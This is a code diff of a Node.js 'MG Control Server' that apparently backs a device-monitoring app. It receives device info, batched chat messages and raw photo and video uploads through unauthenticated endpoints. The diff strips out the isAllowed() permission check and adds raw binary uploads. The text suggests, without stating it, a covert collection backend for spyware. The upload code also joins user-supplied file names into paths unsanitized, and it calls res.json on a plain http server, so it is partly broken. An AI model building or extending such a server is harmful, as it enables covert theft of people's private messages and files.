@@ -52,20 +52,6 @@ function loadConfig() {
     }
 }
 
-function isAllowed(req, type) {
-    const cfg = loadConfig();
-    const ip = getIP(req);
-    const model = req.query.model || "";
-
-    if (!cfg.enabled) return false;
-    if (type === "track" && !cfg.send_device_info) return false;
-    if (type === "upload" && !cfg.send_files) return false;
-    if (cfg.blocked_ips?.includes(ip)) return false;
-    if (cfg.blocked_models?.includes(model)) return false;
-
-    return true;
-}
-
 // ============================================
 // COMMAND (in-memory)
 // ============================================
@@ -465,7 +451,6 @@ const server = http.createServer(async (req, res) => {
         // ============================================
         if (req.method === "GET" && url.pathname === "/config") {
             const cfg = loadConfig();
-            // Send "1" if enabled, "0" if disabled (for app compatibility)
             res.writeHead(200, {
                 "Content-Type": "text/plain",
                 "Cache-Control": "no-store"
@@ -608,96 +593,157 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================
-        // FILE UPLOAD
+        // FILE UPLOAD - RAW BINARY + MULTIPART SUPPORT
         // ============================================
         if (req.method === "POST" && url.pathname === "/upload") {
             const contentType = req.headers["content-type"] || "";
+            const deviceId = req.query.deviceId || "unknown";
+            const fileName = req.query.name || "file.bin";
 
-            if (!contentType.includes("multipart/form-data")) {
-                return json(res, { ok: false, error: "multipart/form-data required" }, 400);
+            // ✅ RAW BINARY (App sends this)
+            if (contentType.includes("application/octet-stream") ||
+                contentType.includes("image/jpeg") ||
+                contentType.includes("image/png") ||
+                contentType.includes("video/mp4")) {
+
+                let buffer = Buffer.alloc(0);
+                req.on("data", (chunk) => {
+                    buffer = Buffer.concat([buffer, chunk]);
+                });
+
+                req.on("end", () => {
+                    try {
+                        // Ensure device exists in Supabase
+                        ensureDevice(deviceId, { deviceId }, req);
+
+                        const safeName = `${Date.now()}_${fileName}`;
+                        const filePath = path.join(UPLOAD_DIR, safeName);
+                        fs.writeFileSync(filePath, buffer);
+
+                        const thumbName = `thumb_${safeName}`;
+                        const thumbPath = path.join(THUMB_DIR, thumbName);
+                        fs.copyFileSync(filePath, thumbPath);
+
+                        saveLog({
+                            type: "file",
+                            file: safeName,
+                            original: fileName,
+                            folder: ".",
+                            thumb: thumbName,
+                            device_id: deviceId,
+                            ip: getIP(req),
+                            size: buffer.length,
+                            time: new Date().toISOString()
+                        });
+
+                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${deviceId} | ${fileName} (${buffer.length} bytes)`);
+
+                        res.json({
+                            ok: true,
+                            file: safeName,
+                            device_id: deviceId,
+                            message: "File uploaded successfully"
+                        });
+
+                    } catch (error) {
+                        console.error("Upload error:", error);
+                        res.status(500).json({ ok: false, error: "Upload failed" });
+                    }
+                });
+
+                req.on("error", () => {
+                    res.status(500).json({ ok: false, error: "Upload failed" });
+                });
+
+                return;
             }
 
-            // Parse multipart manually
-            let buffer = Buffer.alloc(0);
-            req.on("data", (chunk) => {
-                buffer = Buffer.concat([buffer, chunk]);
-            });
+            // ✅ MULTIPART (for curl / web)
+            if (contentType.includes("multipart/form-data")) {
+                let buffer = Buffer.alloc(0);
+                req.on("data", (chunk) => {
+                    buffer = Buffer.concat([buffer, chunk]);
+                });
 
-            req.on("end", async () => {
-                try {
-                    const boundary = getBoundary(contentType);
-                    if (!boundary) {
-                        return json(res, { ok: false, error: "Invalid boundary" }, 400);
-                    }
-
-                    const parts = parseMultipart(buffer, boundary);
-                    let deviceId = null;
-                    let fileName = null;
-                    let fileData = null;
-
-                    for (const part of parts) {
-                        const cd = part.headers["content-disposition"] || "";
-                        if (cd.includes('name="deviceId"')) {
-                            deviceId = part.data.toString("utf8").trim();
-                        } else if (cd.includes('name="file"')) {
-                            const match = cd.match(/filename="([^"]+)"/);
-                            fileName = match ? match[1] : "file.bin";
-                            fileData = part.data;
+                req.on("end", async () => {
+                    try {
+                        const boundary = getBoundary(contentType);
+                        if (!boundary) {
+                            return json(res, { ok: false, error: "Invalid boundary" }, 400);
                         }
+
+                        const parts = parseMultipart(buffer, boundary);
+                        let deviceIdFromPart = null;
+                        let fileNameFromPart = null;
+                        let fileData = null;
+
+                        for (const part of parts) {
+                            const cd = part.headers["content-disposition"] || "";
+                            if (cd.includes('name="deviceId"')) {
+                                deviceIdFromPart = part.data.toString("utf8").trim();
+                            } else if (cd.includes('name="file"')) {
+                                const match = cd.match(/filename="([^"]+)"/);
+                                fileNameFromPart = match ? match[1] : "file.bin";
+                                fileData = part.data;
+                            }
+                        }
+
+                        const finalDeviceId = deviceIdFromPart || deviceId;
+                        const finalFileName = fileNameFromPart || fileName;
+
+                        if (!finalDeviceId) {
+                            return json(res, { ok: false, error: "deviceId required" }, 400);
+                        }
+
+                        if (!fileData) {
+                            return json(res, { ok: false, error: "No file uploaded" }, 400);
+                        }
+
+                        await ensureDevice(finalDeviceId, { deviceId: finalDeviceId }, req);
+
+                        const safeName = `${Date.now()}_${finalFileName}`;
+                        const filePath = path.join(UPLOAD_DIR, safeName);
+                        fs.writeFileSync(filePath, fileData);
+
+                        const thumbName = `thumb_${safeName}`;
+                        const thumbPath = path.join(THUMB_DIR, thumbName);
+                        fs.copyFileSync(filePath, thumbPath);
+
+                        saveLog({
+                            type: "file",
+                            file: safeName,
+                            original: finalFileName,
+                            folder: ".",
+                            thumb: thumbName,
+                            device_id: finalDeviceId,
+                            ip: getIP(req),
+                            size: fileData.length,
+                            time: new Date().toISOString()
+                        });
+
+                        console.log(`[UPLOAD] ${getIP(req)} | Device: ${finalDeviceId} | ${finalFileName} (${fileData.length} bytes)`);
+
+                        return json(res, {
+                            ok: true,
+                            file: safeName,
+                            device_id: finalDeviceId,
+                            message: "File uploaded successfully"
+                        });
+
+                    } catch (error) {
+                        console.error("Upload error:", error);
+                        return json(res, { ok: false, error: "upload failed" }, 500);
                     }
+                });
 
-                    if (!deviceId) {
-                        return json(res, { ok: false, error: "deviceId required" }, 400);
-                    }
-
-                    if (!fileData) {
-                        return json(res, { ok: false, error: "No file uploaded" }, 400);
-                    }
-
-                    // Ensure device exists in Supabase
-                    await ensureDevice(deviceId, { deviceId }, req);
-
-                    // Save file locally
-                    const safeName = `${Date.now()}_${fileName}`;
-                    const filePath = path.join(UPLOAD_DIR, safeName);
-                    fs.writeFileSync(filePath, fileData);
-
-                    // Save thumbnail
-                    const thumbName = `thumb_${safeName}`;
-                    const thumbPath = path.join(THUMB_DIR, thumbName);
-                    fs.copyFileSync(filePath, thumbPath);
-
-                    // Log file with device_id
-                    saveLog({
-                        type: "file",
-                        file: safeName,
-                        original: fileName,
-                        folder: path.dirname(fileName) || "/",
-                        thumb: thumbName,
-                        device_id: deviceId,
-                        ip: getIP(req),
-                        size: fileData.length,
-                        time: new Date().toISOString()
-                    });
-
-                    return json(res, {
-                        ok: true,
-                        file: safeName,
-                        device_id: deviceId,
-                        message: "File uploaded successfully"
-                    });
-
-                } catch (error) {
-                    console.error("Upload error:", error);
+                req.on("error", () => {
                     return json(res, { ok: false, error: "upload failed" }, 500);
-                }
-            });
+                });
 
-            req.on("error", () => {
-                return json(res, { ok: false, error: "upload failed" }, 500);
-            });
+                return;
+            }
 
-            return;
+            return json(res, { ok: false, error: "multipart/form-data or raw binary required" }, 400);
         }
 
         // ============================================
@@ -833,31 +879,49 @@ const server = http.createServer(async (req, res) => {
 
 server.listen(port, () => {
     const cfg = loadConfig();
-    console.log(`========================================`);
-    console.log(`🚀 MG Server running on port ${port}`);
-    console.log(`📡 URL: http://localhost:${port}`);
-    console.log(`========================================`);
-    console.log(`📦 Supabase (Chat + Device Info)`);
-    console.log(`📁 Local Storage (Files)`);
-    console.log(`   Uploads: ${UPLOAD_DIR}`);
-    console.log(`   Thumbs: ${THUMB_DIR}`);
-    console.log(`========================================`);
-    console.log(`📋 Config:`);
-    console.log(`   Enabled: ${cfg.enabled}`);
-    console.log(`   Send Device Info: ${cfg.send_device_info}`);
-    console.log(`   Send Files: ${cfg.send_files}`);
-    console.log(`   File Types: ${cfg.fileTypes?.join(", ") || "all"}`);
-    console.log(`========================================`);
-    console.log(`📋 Endpoints:`);
-    console.log(`   GET  /                    - Dashboard`);
-    console.log(`   GET  /config              - App config (1/0)`);
-    console.log(`   POST /api/heartbeat       - Device info (Supabase)`);
-    console.log(`   POST /api/chat/batch      - Chats (Supabase)`);
-    console.log(`   POST /upload              - File upload (Local)`);
-    console.log(`   GET  /api/files           - Get device files`);
-    console.log(`   GET  /uploads/:file       - Serve file`);
-    console.log(`   GET  /thumbs/:file        - Serve thumbnail`);
-    console.log(`   DELETE /api/file/:file    - Delete file`);
-    console.log(`   GET  /api/debug           - Debug all data`);
-    console.log(`========================================`);
+    console.log(`
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║   🚀 MG CONTROL SERVER                                      ║
+║   📡 Running on: http://localhost:${port}                     ║
+║   🌐 Public URL: https://mg-control-server.onrender.com     ║
+║                                                              ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   📋 CONFIG:                                                ║
+║      Enabled: ${cfg.enabled ? '✅' : '❌'}  Send Device Info: ${cfg.send_device_info ? '✅' : '❌'}  Send Files: ${cfg.send_files ? '✅' : '❌'}  ║
+║      File Types: ${cfg.fileTypes?.join(', ') || 'all'}                  ║
+║      Upload Window: ${cfg.uploadWindow || '24/7'}                         ║
+║                                                              ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   📁 STORAGE:                                               ║
+║      Uploads: ${UPLOAD_DIR}                                ║
+║      Thumbs: ${THUMB_DIR}                                  ║
+║      Logs: ${LOG_FILE}                                     ║
+║                                                              ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   📌 ENDPOINTS:                                             ║
+║                                                              ║
+║   🔓 PUBLIC:                                                ║
+║      GET  /                 - Server status                 ║
+║      GET  /config           - App config (1/0)             ║
+║      POST /api/heartbeat    - Device heartbeat             ║
+║      POST /api/chat/batch   - Chat messages                ║
+║      POST /upload           - File upload (RAW + Multipart)║
+║      GET  /api/files        - Device files                 ║
+║      GET  /api/all-files    - All files                    ║
+║      GET  /uploads/*        - Serve uploaded files         ║
+║      GET  /thumbs/*         - Serve thumbnails             ║
+║      DELETE /api/file/*     - Delete file                  ║
+║                                                              ║
+╠══════════════════════════════════════════════════════════════╣
+║                                                              ║
+║   💡 QUICK LINKS:                                           ║
+║      Dashboard: http://localhost:${PORT}/                    ║
+║      Files:     http://localhost:${PORT}/api/all-files              ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+    `);
 });
